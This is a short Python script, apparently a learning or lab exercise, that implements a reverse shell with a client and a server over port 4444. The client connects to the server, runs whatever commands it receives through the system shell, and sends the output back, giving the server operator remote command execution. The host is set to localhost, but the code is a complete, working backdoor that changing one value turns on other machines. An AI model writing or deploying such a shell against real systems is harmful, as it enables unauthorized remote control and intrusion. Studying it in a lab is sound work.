import socket
import subprocess
import threading

REMOTE_HOST, PORT = '127.0.0.1', 4444


def client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((REMOTE_HOST, PORT))
    print('[+] Connected to the remote host')

    while True:
        command = client_socket.recv(1024).decode()
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            message = stdout.decode()
        else:
            message = stderr.decode()

        # Send the output to the server
        client_socket.sendall(message.encode())
        if command == 'exit':
            break


def server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((REMOTE_HOST, PORT))
    server_socket.listen()
    print('[!] Server is up and running...')

    client_socket, client_addr = server_socket.accept()
    print(f'[+] Established a connection with {client_addr}')

    while True:
        command = input('[*] Enter command: ').encode()
        client_socket.send(command)
        response = client_socket.recv(1024).decode()
        print(response)
        if command == b'exit':
            break


def main():
    # arguments = argparse.ArgumentParser()
    # arguments.add_argument('-s', '--server', help='Run program as server')
    # arguments.add_argument('-c', '--client', help='Run program as client')
    #
    # arguments = arguments.parse_args()
    user_input = input('Enter s for server, c for client: ')
    if user_input == 's':
        threading.Thread(target=server).start()

    elif user_input == 'c':
        threading.Thread(target=client).start()


if __name__ == '__main__':
    main()
